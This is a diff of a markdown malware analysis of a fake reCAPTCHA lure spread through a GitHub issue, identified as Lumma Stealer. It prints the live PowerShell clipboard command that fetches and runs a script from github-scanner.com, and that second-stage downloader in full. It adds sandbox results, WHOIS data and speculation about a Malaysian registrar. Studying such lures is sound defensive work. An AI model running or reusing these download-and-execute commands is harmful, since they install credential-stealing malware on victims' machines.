@@ -23,51 +23,109 @@ As expected, github identified it as fradulent / malicious and has deleted that 
 
 But, i still have the content of that malicious issue opened in my emails. So, i clicked on this link.
 
-It asked to me verify if i'm not a robot. you might expect something similar when using VPNs
+It asked to me verify if i'm not a robot. you might encounter something similar when using VPNs to access certian websites. 
+
+But this looks completely different than what services like cloudflare, and yes, it's custom written.
 
 ![alt text](image-2.png)
 
+After you click to verify, a text (a powershell command) will be copied to your clipboard by the website. And it will ask you to open `Run` -> `CTRL+V` to paste -> `Enter` to run that command.
+
+This is not how human verification works. Its done using an image or a sound clip most of the time.
+
 ![alt text](image-3.png)
 
-DO NOT RUN THIS!
+This is what's being copied to the clipboard. 
 
 ```
 powershell.exe -w hidden -Command "iex (iwr 'https://github-scanner.com/download.txt').Content" # "✅ ''I am not a robot - reCAPTCHA Verification ID: 93752"
 ```
 
+Lets break it down.
+
+- `powershell.exe -w hidden` will run the powershell script in hidden mode, so, no console will be visible to the user.
+
+- `-Command "iex (iwr 'https://github-scanner.com/download.txt').Content"` will fetch the content available at: `https://github-scanner.com/download.txt` and will execute it immediately, in the background.
+    - `iex` short for `Invoke-Expression` will execute a string as it was a command
+    - `iwr` short for `Invoke-WebRequest` will send a web request to this: `https://github-scanner.com/download.txt` url
+    - `.Content` will extract the contents returned from that web request.
+- `# "✅ ''I am not a robot - reCAPTCHA Verification ID: 93752"` is just a a comment, so it doesnt affect he command's functionality. It's sole purpose is to trick the user into thinking that nothing suspicious is running and what we paste is related to the human verification process.
+
+This is what it will look like after it gets pasted to the Run box
+
+![alt text](image-25.png)
+
+Lets see what this command fetches and executes.
+
+And `https://github-scanner.com/download.txt` contains a powershell script
+
+```ps1
+$WebClient = New-Object System.Net.Webclient
+$url1 = "https://gitub-scanner.com/l6E.exe"
+$filePath1 = "$env:TEMP\SysSetup.exe"
+$webClient.DownloadFile($url1, $filePath1)
+Start-Process -FilePath $env:TEMP\SysSetup.exe
+```
+
+Let's break it down:
+
+- `$WebClient = New-Object System.Net.Webclient` will create a new instance of the `WebClient` class , which allows you to download files from the web.
+- `$url1 = "https://github-scanner.com/l6E.exe"`sets the url of the file that will be downloaded. Its a file called `l6E.exe` hosted in `github-scanner.com`
+- `$filePath1 = "$env:TEMP\SysSetup.exe"` will be the place where this downloaded file will be saved to. Note that it uses the name `SysSetup.exe` to make it look less suspicous to the end user, if he ever notices in taskmgr
+- `$webClient.DownloadFile($url1, $filePath1)` will download this file stored in `$url1` and store it to `$filePath1`
+- `Start-Process -FilePath $env:TEMP\SysSetup.exe` will run this saved file. 
+
 ![alt text](image-4.png)
 
-![alt text](image-5.png)
-
-![alt text](image-7.png)
+Via static analysis through Virus Total, looks like only 12 engines has detected this. Its seems to be a fairly common stealer, but only 12 engined detected it. Maybe it has to do something with the way its packet. I'm not exactly sure. [Click here](https://www.virustotal.com/gui/url/b64a25fef85ad988dee3ds3b772ea60dc4d53333cd0857924745c000ff858c5eb) to open the report.
 
 ![alt text](image-14.png)
 
-https://www.virustotal.com/gui/url/b64a25fef85ad988dee3d3b772ea60dc4d53333cd0857924745c000ff858c5eb
+
+Looks like there's already a comment made on Virus Total, and looks like he got to this via the same way as it did. 
 
 ![alt text](image-15.png)
 
-https://app.any.run/tasks/8ac63e3e-621c-4d47-b832-73dad43c208c
+Lets run this sample through any.run for some dynamic analysis. [Click here](https://app.any.run/tasks/8ac63e3e-621c-4d47-b832-73dad43c208c
+) to open the report.
+
+![alt text](image-5.png)
+
+We can see that it makes connections to many unknown hosts. Maybe they do it for redundancy in their end, incase if one IP or a domain gets taken down, they will still recieve the data from another IP or a domain.
+
+We can also see that Suricata (an open source intrusion detection system) has identified this to `LUMMA Stealer`
+
+
+![alt text](image-7.png)
+
 
 ![alt text](image-6.png)    
 
-https://tria.ge/240919-fczkva1gja/behavioral1
+Putting it for further dynamic analysis through tria.ge. We can confirm stuff furthermore. [Click here](https://tria.ge/240919-fczkva1gja/behavioral1) to open the report.
 
-![alt text](image-8.png)
+We can also see that this malicious program does Browser Information Discovery, followed by some other discovery techniques.
 
 ![alt text](image-9.png)
 
+We can see that the stealer tries to contact several domains. There is also a GET request made to a steam profile - no idea where that came from.
+
+![alt text](image-8.png)
+
 ![alt text](image-10.png)
 
-we will report it
+Let's take a look at this IP address where this web server is hosted it.
 
 ![alt text](image-11.png)
+
+When we look that IP up, we can find information about its provider and also the provider's email address which we can report abuse to. 
 
 ![alt text](image-13.png)
 
 ![alt text](image-12.png)
 
-WHOIS
+I did report them via email.
+
+I also got the WHOIS report on this domain.
 
 ```
    Domain Name: GITHUB-SCANNER.COM
@@ -88,38 +146,7 @@ WHOIS
    URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
 >>> Last update of whois database: 2024-09-19T04:59:15Z <<<
 
-For more information on Whois status codes, please visit https://icann.org/epp
-
-NOTICE: The expiration date displayed in this record is the date the
-registrar's sponsorship of the domain name registration in the registry is
-currently set to expire. This date does not necessarily reflect the expiration
-date of the domain name registrant's agreement with the sponsoring
-registrar.  Users may consult the sponsoring registrar's Whois database to
-view the registrar's reported date of expiration for this registration.
-
-TERMS OF USE: You are not authorized to access or query our Whois
-database through the use of electronic processes that are high-volume and
-automated except as reasonably necessary to register domain names or
-modify existing registrations; the Data in VeriSign Global Registry
-Services' ("VeriSign") Whois database is provided by VeriSign for
-information purposes only, and to assist persons in obtaining information
-about or related to a domain name registration record. VeriSign does not
-guarantee its accuracy. By submitting a Whois query, you agree to abide
-by the following terms of use: You agree that you may use this Data only
-for lawful purposes and that under no circumstances will you use this Data
-to: (1) allow, enable, or otherwise support the transmission of mass
-unsolicited, commercial advertising or solicitations via e-mail, telephone,
-or facsimile; or (2) enable high volume, automated, electronic processes
-that apply to VeriSign (or its computer systems). The compilation,
-repackaging, dissemination or other use of this Data is expressly
-prohibited without the prior written consent of VeriSign. You agree not to
-use electronic processes that are automated and high-volume to access or
-query the Whois database except as reasonably necessary to register
-domain names or modify existing registrations. VeriSign reserves the right
-to restrict your access to the Whois database in its sole discretion to ensure
-operational stability.  VeriSign may restrict or terminate your access to the
-Whois database for failure to abide by these terms of use. VeriSign
-reserves the right to modify these terms at any time.
+...
 
 The Registry database contains ONLY .COM, .NET, .EDU domains and
 Registrars.
@@ -182,29 +209,15 @@ DNSSEC: unsigned
 
 URL of the ICANN WHOIS Data Problem Reporting System: https://www.icann.org/wicf
 >>> Last update of WHOIS database: 2024-09-19T04:59:24Z <<<
-
-For more information on Whois status codes, please visit https://icann.org/epp
-
-The Data in Web Commerce Communications Limited ("WEBCC")'s WHOIS database 
-is provided by WEBCC for information purposes, and to assist in obtaining 
-information about or related to a domain name registration record. WEBCC 
 does not guarantee its accuracy. By submitting a WHOIS query, you agree 
 that you will use this Data only for lawful purposes and that, under no 
 circumstances will you use this Data to:
 
-(1) allow, enable, or otherwise support the transmission of mass unsolicited, 
-    commercial advertising or solicitations via e-mail (spam).
-(2) enable high volume, automated, electronic processes that apply to WEBCC
-    (or its systems).
-
-The compilation, repackaging, dissemination or other use of this Data is
-expressly prohibited without the prior written consent of WEBCC. WEBCC 
-reserves the right to terminate your access to the WEBCC WHOIS database in 
-its sole discretion, including without limitation, for excessive querying 
-of the WHOIS database or for failure to otherwise abide by this policy. 
-WEBCC reserves the right to modify these terms at any time.			
+...
 ```
 
+Information in the WHOIS lookup is just the contact information for the company that owns the registrar.
+WebNic (The Registrar) seems to be owned by https://www.qinetics.net/.
 
 ```
 Admin Street: L4-E-2, Level 4, Enterprise 4, Technology Park Malaysia, Bukit Jalil
@@ -214,69 +227,26 @@ Admin Postal Code: 57000
 Admin Country: Malaysia
 Admin Phone: +60.389966788
 ```
-Looks like the registrant is from Malaysia, Singapore, Indonesia, Thailand, Korea, Hong Kong:
 
-and the number is associated with many scams:
-
-
-
-![alt text](image-24.png)
-
-
-NOTE: THEY ARE EITHER A SERVICE PROVIDER BEING ABUSED BY SCAMMERS
-OR THEY THEMSELVES ARE THE SCAMMERS
+And, googling this phone number leads you to many scams that has been reported previously by a large number of people over a long time span.
 
 ![alt text](image-16.png)
 
-Upon googling, we can sort of confirm the details about him.
+Googling the address will show you these results:
 
-https://scammer.info/t/paypal-sms-phishing/67211        
+Which looks like several bussinesses using the same address? Or they might be in the same building, but the "L4-E-2, Level 4, Enterprise 4" makes me think its the extract address of their office inside that building.
 
-```
-**Street:**L4-E-2, Level 4, Enterprise 4, Technology Park Malaysia, Bukit Jalil
-**City: **Kuala Lumpur
-**State: **Wilayah Persekutuan
-**Postal Code: **57000
-**Country: **Malaysia
-```
+Note how inconsistent the addresses are for each company name.
 
-"Information in the whois is just the contact information for the company that owns the registrar.
-WebNic (The Registrar) seems to be owned by https://www.qinetics.net/. I think this is as far as the story goes, nothing illegitimate with qinetics and no obvious leads forwards."
+![alt text](image-26.png)
 
-company info: (possibly sketchy)
+Most probably, "Qinetics Solutions Sdn Bhd" might be a legitamata company and Qnity might be the scammers, with a name close enough to a legitate bussiness, nearby.
 
-![alt text](image-17.png)
-
-this seems to be a company with a similiar name in the same address, possible the same floor, `L4-E-2, HIVE 5`
-and it might be mistaken to the original scam
-
-![alt text](image-18.png)
-
-which is at: `L4-E-2, LEVEL 4`
+These google reviews in this relatively small company also proves the fact that more people has encountered scams via domains provided by this registrar. 
 
 ![alt text](image-19.png)
 
-location: https://www.google.com/local/place/fid/0x31cc4bec697c837f:0x7eebfaa37d15c1bc/photosphere?iu=https://streetviewpixels-pa.googleapis.com/v1/thumbnail?panoid%3DPRZfcZ5YwkoeawI7IvJwsA%26cb_client%3Dlu.gallery.gps%26w%3D160%26h%3D106%26yaw%3D145.84714%26pitch%3D0%26thumbfov%3D100&ik=CAISFlBSWmZjWjVZd2tvZWF3STdJdkp3c0E%3D 
+There are two conclusions which we can draw.
 
-or, it might even be the same company
-
-![alt text](image-20.png)   
-
-Qinetics Solutions Sdn Bhd are hiring:
-
-![alt text](image-21.png)
-
-reg.asia might be a service provider
-
-https://www.reg.asia/contact-us/    
-
-![alt text](image-22.png)
-
-![alt text](image-23.png)
-
-yeah
-
-what it come down to is customers abusing a company - possibly...
-
-
+It's either a legitamate company providing legitamate services, which are being heavily abused by scammers or an illegitimate company that scams people.
 
